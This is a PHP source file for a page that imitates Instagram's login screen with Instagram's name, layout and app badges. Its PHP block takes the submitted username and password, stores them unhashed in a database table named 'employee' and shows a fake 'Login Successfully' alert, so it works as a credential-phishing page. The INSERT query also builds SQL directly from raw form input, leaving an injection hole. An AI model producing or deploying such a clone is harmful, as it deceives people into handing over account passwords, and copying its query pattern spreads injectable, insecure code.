<?php
include "coon.php";
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Galada&display=swap" rel="stylesheet">
    <title>instagram Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color:white;
            color: #262626;
        }
        .container {
            width: 250px;
            margin: 20px auto 30px;
            text-align: center;
            border: 1px solid #ccc;
            padding:30px 30px 0px 30px;
        }
        input[type="text"], input[type="password"] {
           width: 100%;
           padding: 12px 20px;
           margin: 3px 0;
           display: inline-block;
           background-color: #fafafa;
           border: 1px solid #ccc;
           border-radius: 4px;
           box-sizing: border-box;
        }
        input[type="submit"] {
            width: 100%;
            background-color: #3897f0;
             color: white;
             padding: 8px 20px;
             margin: 3px 0;
             border: none;
             border-radius: 8px;
             cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #3578e5;
        }
        h1 {
            font-family: "Galada", cursive;
            font-weight: 400;
            font-style: normal;
            margin-bottom: 20px;
            font-size: 35px;
        }

        .signup {
            width: 250px;
            text-align: center;
            margin: -15px auto;
            padding: 0px 30px;
            border: 1px solid #ccc;
        }
        .signup a {
            color: #3897f0;
            text-decoration: none;
        }
        .clear {
            color: #3897f0;
        }
        section{
            font-size: 12px;
        }
        h5 img {
            width: 20px;
            height: 20px;
            vertical-align: middle;
            margin-bottom: 2px;
        }
        h5 {
            text-align: center;
        }
        .app {
            text-align: center;
            margin-top: 20px;
        }
        .app img {
            width: 100px;
            height: 35px;
            margin: 0 5px;
        }
        </style>
</head>
<body>
    <div class="container">
    <h1 class="name">Instagram</h1>
    <form action="" method="POST">
        <input type="text" name="username" placeholder="Phone number, username, or email" required>
        <br>
        <input type="password" name="password" placeholder="Password" required>
        <br><br>
        <input type="submit" value="Log in" name="Login">
        <br>
        <br>
        <section>OR</section>
        <h5 class="clear"><img src="facebook.png">
        Log in with Facebook</h5>
        <h5>Forgot password?</h5>
        </form>
        </div>
        <div class="signup">
        <h5>Don't have an account?
            <a href="signup.php">Sign up</a></h5>
    </div>
    <h5 style="margin-top: 40px;">Get the app.</h5>
    <div class="app">
        <img src="download.png" alt="Google app" style="width: 100px; height: 35px;">
        <img src="5a902db47f96951c82922873.png" alt="Microsoft app" style="width: 100px; height: 35px;">
    </div>
    <style>
   @media sreen and (min-width: 600px) {
       .container {
           width: 400px;
           margin: 40px auto 30px;
       }
       input[type="text"], input[type="password"] {
           width: 90%;
       }
       input[type="submit"] {
           width: 90%;
       }
       .signup {
           width: 400px;
       }
    
   }
    </style>
    <?php
if (isset($_POST['Login'])) {
    $email = $_POST['username'];
    $password = $_POST['password'];

    $query = "INSERT INTO employee (email, password) VALUES ('$email', '$password')";
    $data=mysqli_query($coon, $query);

    if ($data) {
        ?>
        <script>
        alert('Login Successfully');
        </script>
        <?php
    }
    else {
        ?>
        <script>
        alert('Please try again');
        </script>
        <?php
    }
   
}
?>
</body>
</html>
